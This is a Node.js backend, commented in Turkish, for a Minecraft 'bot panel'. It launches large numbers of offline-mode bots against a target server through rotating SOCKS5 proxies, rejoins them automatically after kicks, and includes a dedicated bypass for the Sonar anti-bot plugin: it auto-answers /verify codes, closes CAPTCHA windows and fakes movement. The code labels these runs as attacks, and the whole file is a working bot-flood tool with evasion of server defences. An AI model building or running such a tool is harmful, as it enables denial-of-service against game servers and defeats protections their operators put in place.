/**
 * MC Bot Panel — Backend
 * Sonar Anti-Bot Bypass dahil
 * Requires: mineflayer, ws, express, fs
 */

const express    = require('express');
const { WebSocketServer } = require('ws');
const { createServer }    = require('http');
const mineflayer = require('mineflayer');
const fs         = require('fs');
const path       = require('path');

// ─── HTTP + WebSocket Sunucusu ───────────────────────────────────────────────

const app    = express();
const server = createServer(app);
const wss    = new WebSocketServer({ server });

// Statik dosya (index.html)
app.use(express.static(path.join(__dirname)));

// ─── Durum ───────────────────────────────────────────────────────────────────

let activeBots   = new Map();   // name → bot instance
let attackConfig = null;
let running      = false;
let joinTimers   = [];

// ─── WS Broadcast ────────────────────────────────────────────────────────────

function broadcast(obj) {
  const raw = JSON.stringify(obj);
  wss.clients.forEach(c => { if (c.readyState === 1) c.send(raw); });
}

function botStatus(name, status, detail = '') {
  broadcast({ type: 'bot_status', name, status, detail });
}

function log(text, level = 'muted') {
  console.log(`[${level.toUpperCase()}] ${text}`);
  broadcast({ type: 'log', text, level });
}

// ─── Proxy Yükleyici ─────────────────────────────────────────────────────────

function loadProxies(file) {
  try {
    if (!fs.existsSync(file)) return [];
    return fs.readFileSync(file, 'utf8')
      .split('\n')
      .map(l => l.trim())
      .filter(Boolean)
      .map(l => {
        // Format: ip:port ya da ip:port:user:pass
        const parts = l.split(':');
        return {
          host: parts[0],
          port: parseInt(parts[1]) || 1080,
          username: parts[2] || null,
          password: parts[3] || null,
        };
      });
  } catch { return []; }
}

// ─── Sonar Bypass Core ───────────────────────────────────────────────────────
//
//  Sonar'ın yaptığı kontroller:
//  1. Gravity check — oyuncu belirli bir mesafe düşmeli (mineflayer fizik simülasyonu bunu doğal halleder)
//  2. KeepAlive — sunucu keepalive paketlerine cevap vermeli
//  3. Join throttling — çok hızlı join'i reddeder → joinDelay ile aşılır
//  4. Chat verify — bazı sunucularda /verify <kod> ya da chat CAPTCHA
//  5. Packet order — geçerli Minecraft client sırası beklenir (mineflayer bunu handle eder)

function setupSonarBypass(bot, bypassMode) {

  // --- Gravity Sim ---
  // mineflayer zaten gravity simülasyonu yapar; bot join olunca otomatik düşer.
  // Bunu garanti etmek için physics engine aktif bırakılır (default zaten aktif).

  // --- KeepAlive ---
  // mineflayer keepalive'ı otomatik handle eder.

  // --- Chat Verify bypass ---
  if (bypassMode === 'chat' || bypassMode === 'both') {
    bot.on('message', (jsonMsg) => {
      const msg = jsonMsg.toString().toLowerCase();

      // Sonar veya benzeri plugin'lerin gönderebileceği verify mesajları
      if (msg.includes('/verify') || msg.includes('verification') || msg.includes('doğrula')) {
        // Mesajdan kodu çıkarmaya çalış: "Type /verify <code>" formatı
        const codeMatch = jsonMsg.toString().match(/\/verify\s+(\S+)/i);
        if (codeMatch) {
          setTimeout(() => {
            bot.chat(`/verify ${codeMatch[1]}`);
            log(`${bot.username} verify komutu gönderdi: /verify ${codeMatch[1]}`, 'info');
          }, 500 + Math.random() * 500);
        }
      }

      // Bazı sunucular "Click to verify" book vs. gönderir
      // Bu durumda bot inventory action gerekir — aşağıda generic handler
    });

    // Book/Sign CAPTCHA handler (Sonar'ın eski versiyonları)
    bot.on('windowOpen', (window) => {
      // Eğer bir book/sign window açılırsa kapat (Sonar bunu confirm olarak sayar)
      setTimeout(() => {
        try { bot.closeWindow(window); } catch {}
      }, 300);
    });
  }

  // --- Movement spoof (bazı strict kontroller için) ---
  // Sonar standard: bot yerçekimiyle düştükten sonra bir süre hareketsiz durmalı
  // mineflayer bunu doğal handle eder; ek olarak küçük random movement ekleriz:
  bot.once('spawn', () => {
    // Spawn sonrası 1-2sn bekle (verification window'u geç)
    setTimeout(() => {
      // Küçük sallanma hareketi — bazı bot-check sistemleri tamamen statik duranı flagler
      const moves = ['forward', 'back', 'left', 'right'];
      let i = 0;
      const jitter = setInterval(() => {
        if (i >= 4 || !bot._client) { clearInterval(jitter); return; }
        const dir = moves[i++];
        bot.setControlState(dir, true);
        setTimeout(() => { try { bot.setControlState(dir, false); } catch {} }, 100);
      }, 300);
    }, 1200 + Math.random() * 800);
  });
}

// ─── Bot Oluşturucu ──────────────────────────────────────────────────────────

function createBot(name, config, proxy = null) {
  botStatus(name, 'joining');

  const opts = {
    host:    config.ip,
    port:    config.port,
    username: name,
    version: config.version,
    auth:    'offline',         // offline mod (cracked sunucular)
    hideErrors: true,
    checkTimeoutInterval: 60000,
    // Physics aktif — Sonar gravity check için şart
    physicsEnabled: true,
  };

  // Proxy desteği (socks5)
  if (proxy) {
    opts.connect = (client) => {
      const socks = require('socks').SocksClient;
      socks.createConnection({
        proxy: {
          host: proxy.host,
          port: proxy.port,
          type: 5,
          userId:   proxy.username || undefined,
          password: proxy.password || undefined,
        },
        command: 'connect',
        destination: { host: config.ip, port: config.port },
      }, (err, info) => {
        if (err) { log(`${name} proxy bağlantı hatası: ${err.message}`, 'error'); return; }
        client.setSocket(info.socket);
        client.emit('connect');
      });
    };
  }

  let bot;
  try { bot = mineflayer.createBot(opts); }
  catch (e) {
    log(`${name} oluşturma hatası: ${e.message}`, 'error');
    botStatus(name, 'kicked', e.message);
    scheduleRejoin(name, config, proxy);
    return;
  }

  activeBots.set(name, bot);
  setupSonarBypass(bot, config.bypassMode);

  bot.once('login', () => {
    botStatus(name, 'verifying', 'verification...');
    log(`${name} sunucuya girdi, verification bekleniyor`, 'info');
  });

  bot.once('spawn', () => {
    botStatus(name, 'online');
    log(`${name} spawn oldu — online`, 'success');
  });

  bot.on('kicked', (reason) => {
    const r = reason?.toString?.() || String(reason);
    botStatus(name, 'kicked', r.slice(0, 80));
    log(`${name} kick edildi: ${r.slice(0, 80)}`, 'error');
    activeBots.delete(name);
    if (running) scheduleRejoin(name, config, proxy);
  });

  bot.on('error', (err) => {
    log(`${name} hata: ${err.message}`, 'error');
    activeBots.delete(name);
    if (running) scheduleRejoin(name, config, proxy);
  });

  bot.on('end', () => {
    activeBots.delete(name);
    if (running) scheduleRejoin(name, config, proxy);
  });
}

function scheduleRejoin(name, config, proxy) {
  const delay = config.rejoinDelay + Math.random() * 1000;
  const t = setTimeout(() => {
    if (running) createBot(name, config, proxy);
  }, delay);
  joinTimers.push(t);
}

// ─── Saldırı Başlatma / Durdurma ─────────────────────────────────────────────

function startAttack(config) {
  if (running) stopAttack();
  running      = true;
  attackConfig = config;
  broadcast({ type: 'clear' });

  const proxies = loadProxies(config.proxyFile || 'proxies.txt');
  if (proxies.length > 0)
    log(`${proxies.length} proxy yüklendi`, 'info');
  else
    log('Proxy dosyası bulunamadı veya boş — proxy\'siz devam ediliyor', 'warn');

  log(`Saldırı başlatılıyor: ${config.ip}:${config.port} | ${config.count} bot | delay: ${config.joinDelay}ms`, 'info');

  for (let i = 0; i < config.count; i++) {
    const name  = `${config.prefix}${i.toString().padStart(4, '0')}`;
    const proxy = proxies.length ? proxies[i % proxies.length] : null;
    const delay = i * config.joinDelay + Math.random() * 200;

    const t = setTimeout(() => {
      if (running) createBot(name, config, proxy);
    }, delay);
    joinTimers.push(t);
  }
}

function stopAttack() {
  running = false;
  joinTimers.forEach(clearTimeout);
  joinTimers = [];

  activeBots.forEach((bot, name) => {
    try { bot.quit(); } catch {}
    botStatus(name, 'kicked', 'durduruldu');
  });
  activeBots.clear();
  log('Tüm botlar durduruldu.', 'warn');
}

// ─── WS Mesaj Handler ────────────────────────────────────────────────────────

wss.on('connection', (ws) => {
  log('Panel bağlandı', 'success');

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'start') startAttack(msg);
    if (msg.type === 'stop')  stopAttack();
  });
});

// ─── Sunucu Başlat ───────────────────────────────────────────────────────────

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`\n✅  MC Bot Panel çalışıyor → http://localhost:${PORT}\n`);
});

// Graceful shutdown
process.on('SIGINT', () => { stopAttack(); process.exit(0); });
